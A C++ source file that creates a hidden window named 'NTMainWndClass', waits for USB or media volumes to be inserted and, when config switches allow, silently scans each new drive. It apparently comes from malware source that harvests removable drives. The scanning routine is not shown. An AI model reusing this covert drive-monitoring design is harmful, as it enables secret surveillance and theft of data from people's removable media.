// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "device.hpp"

#include <iostream>
#include <Dbt.h>
#include "StdAfx.hpp"
#include "recursive.hpp"

DWORD __stdcall g_fnThread2(LPVOID lpThreadParameter)
{
	WNDCLASS lpWndClass;
	lpWndClass.style			= 0;
	lpWndClass.lpfnWndProc		= (WNDPROC)WaitForDeviceToConnect;
	lpWndClass.cbClsExtra		= 0;
	lpWndClass.cbWndExtra		= 0;
	lpWndClass.hInstance		= NULL;
	lpWndClass.hIcon			= NULL;
	lpWndClass.hCursor			= NULL;
	lpWndClass.hbrBackground	= NULL;
	lpWndClass.lpszMenuName		= NULL;
	lpWndClass.lpszClassName	= "NTMainWndClass";

	if (NULL == RegisterClass(&lpWndClass))
		return 0;

	HWND hWindow = CreateWindowEx(0, "NTMainWndClass", NULL, WS_POPUP, 0, 0, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, NULL, NULL);
	if (NULL == hWindow)
		return 0;

	ShowWindow(hWindow, 0);
	UpdateWindow(hWindow);

	struct tagMSG tMsg;
	HWND hWnd = NULL;
	DWORD dwMsgFilterMin = 0;
	DWORD dwMsgFilterMax = 0;
	while (1)
	{
		BOOL bRet = GetMessage(&tMsg, hWnd, dwMsgFilterMin, dwMsgFilterMax);
		if (FALSE == bRet || -1 == bRet)
			break;

		TranslateMessage(&tMsg);
		DispatchMessage(&tMsg);

		if (TRUE == g_bUninstall)
			break;

		dwMsgFilterMax = 0;
		dwMsgFilterMin = 0;
		hWnd = NULL;
	}

	return 0;
}

LRESULT WaitForDeviceToConnect(HWND hWnd, UINT nMsg, WPARAM wParam, LPARAM lParam)
{
	if (nMsg != WM_DEVICECHANGE || wParam != DBT_DEVICEARRIVAL)
		return DefWindowProc(hWnd, nMsg, wParam, lParam);

	DEV_BROADCAST_VOLUME *lpDevParam = reinterpret_cast<DEV_BROADCAST_VOLUME*>(lParam);
	if (lpDevParam->dbcv_devicetype != DBT_DEVTYP_VOLUME)
		return DefWindowProc(hWnd, nMsg, wParam, lParam);

	const char *lpszSearchType;
	if (lpDevParam->dbcv_flags & DBTF_MEDIA)
		lpszSearchType = "GSearch";
	else
		lpszSearchType = "USearch";

	CHAR szEnabled[16];
	GetPrivateProfileString("Other", lpszSearchType, "True", szEnabled, sizeof(szEnabled), g_szDNList);

	if (!_stricmp(szEnabled, "True"))
	{
		BYTE bUnit = ConvertUnitMaskToUnitByte(lpDevParam->dbcv_unitmask);

		char szUnit[16];
		sprintf(szUnit, "%c:\\", bUnit);

		ScanDevice(szUnit);
	}

	return DefWindowProc(hWnd, nMsg, wParam, lParam);
}

BYTE ConvertUnitMaskToUnitByte(DWORD dwMask)
{
	BYTE i;

	for(i = 0; !(dwMask & 1) && (i < 26); dwMask >>= 1, i++);
	return i + 'A';
}
